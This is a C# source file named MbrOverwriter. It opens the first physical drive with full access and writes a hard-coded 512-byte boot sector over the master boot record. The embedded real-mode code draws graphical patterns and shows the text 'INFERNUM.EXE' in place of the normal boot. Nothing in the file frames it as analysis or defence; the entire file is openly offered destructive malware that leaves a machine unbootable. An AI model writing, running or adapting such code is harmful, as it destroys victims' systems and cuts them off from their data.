using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace MbrOverwriter
{
    public static class Class1
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        public static void Main(string[] args)
        {
            var mbrData = new byte[] {0xE8, 0x03, 0x00, 0xE8, 0x29, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xDB, 0xE3, 0xE8, 0x7A, 0x01,
0xC3, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0x83, 0x06, 0xCB, 0x7D, 0x1E, 0xE8, 0x01, 0x00, 0xC3, 0x89,
0x0E, 0xCD, 0x7D, 0x89, 0x16, 0xCF, 0x7D, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x1A, 0x0F, 0x87, 0x43,
0x01, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x14, 0x0F, 0x87, 0x2A, 0x01, 0x81, 0x3E, 0xCB, 0x7D, 0x00,
0x12, 0x0F, 0x87, 0x0E, 0x01, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x10, 0x77, 0x6A, 0x81, 0x3E, 0xCB,
0x7D, 0x00, 0x0C, 0x0F, 0x87, 0xEC, 0x00, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x0A, 0x0F, 0x87, 0xD2,
0x00, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x08, 0x0F, 0x87, 0xB4, 0x00, 0x81, 0x3E, 0xCB, 0x7D, 0x00,
0x06, 0x0F, 0x87, 0x9A, 0x00, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x04, 0x0F, 0x87, 0x82, 0x00, 0x81,
0x3E, 0xCB, 0x7D, 0x00, 0x02, 0x77, 0x69, 0x81, 0x3E, 0xCB, 0x7D, 0x00, 0x01, 0x77, 0x4D, 0x81,
0x3E, 0xCB, 0x7D, 0x80, 0x00, 0x77, 0x31, 0x72, 0x17, 0x81, 0xF9, 0x40, 0x01, 0x0F, 0x83, 0xE3,
0x00, 0x81, 0xFA, 0xC8, 0x00, 0x0F, 0x83, 0x68, 0xFF, 0xCD, 0x10, 0x41, 0xE9, 0x70, 0xFF, 0xC3,
0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0xEB, 0xE2, 0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0xC0, 0xC0, 0x03, 0x00,
0xD0, 0x28, 0xD8, 0xC0, 0xC0, 0x02, 0xEB, 0xD1, 0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0x88, 0xD3, 0x80,
0xE3, 0x3F, 0xC0, 0xE0, 0x03, 0x00, 0xD8, 0xC0, 0xC0, 0x04, 0xEB, 0xBD, 0xA0, 0xCB, 0x7D, 0x30,
0xC8, 0x88, 0xD3, 0x80, 0xE3, 0x1F, 0x00, 0xD8, 0xC0, 0xE0, 0x05, 0xC0, 0xC0, 0x07, 0xEB, 0xA9,
0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0x30, 0xD0, 0xC0, 0xC0, 0x04, 0x00, 0xC8, 0xC0, 0xE0, 0x03, 0xEB,
0x98, 0xA0, 0xCB, 0x7D, 0x00, 0xC8, 0x28, 0xD0, 0xC0, 0xC0, 0x05, 0x24, 0xFF, 0xEB, 0x8A, 0xA0,
0xCB, 0x7D, 0x30, 0xC8, 0x00, 0xD0, 0xC0, 0xC0, 0x07, 0xC0, 0xE0, 0x02, 0xE9, 0x7A, 0xFF, 0xA0,
0xCB, 0x7D, 0x88, 0xCB, 0x30, 0xD3, 0x80, 0xE3, 0x3F, 0xC0, 0xC0, 0x02, 0x00, 0xD8, 0x34, 0xAA,
0xE9, 0x66, 0xFF, 0xA0, 0xCB, 0x7D, 0x00, 0xC8, 0x30, 0xD0, 0xC0, 0xE0, 0x02, 0xC0, 0xC0, 0x04,
0xE9, 0x56, 0xFF, 0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0xC0, 0xE0, 0x03, 0xC0, 0xC0, 0x06, 0x00, 0xD0,
0xE9, 0x46, 0xFF, 0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0xC0, 0xE0, 0x05, 0x00, 0xD0, 0xC0, 0xC0, 0x03,
0x34, 0x55, 0xE9, 0x34, 0xFF, 0xA0, 0xCB, 0x7D, 0x30, 0xC8, 0x00, 0xD0, 0xC0, 0xC0, 0x06, 0x28,
0xD8, 0xE9, 0x25, 0xFF, 0xA0, 0xCB, 0x7D, 0x30, 0xD8, 0x00, 0xC8, 0xC0, 0xE0, 0x02, 0xC0, 0xC0,
0x04, 0xE9, 0x15, 0xFF, 0x31, 0xC9, 0x42, 0xE9, 0x95, 0xFE, 0x50, 0x53, 0x89, 0xC8, 0x8E, 0xD8,
0xB4, 0x0E, 0xBE, 0xBE, 0x7D, 0x8A, 0x04, 0x30, 0xFF, 0xB3, 0x20, 0xFE, 0xC3, 0x80, 0xFB, 0x4B,
0x74, 0xF7, 0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C, 0x00, 0x75, 0xF0, 0x5B, 0x58, 0xC3, 0x49, 0x4E,
0x46, 0x45, 0x52, 0x4E, 0x55, 0x4D, 0x2E, 0x45, 0x58, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            Environment.Exit(-1);
        }

    }
}
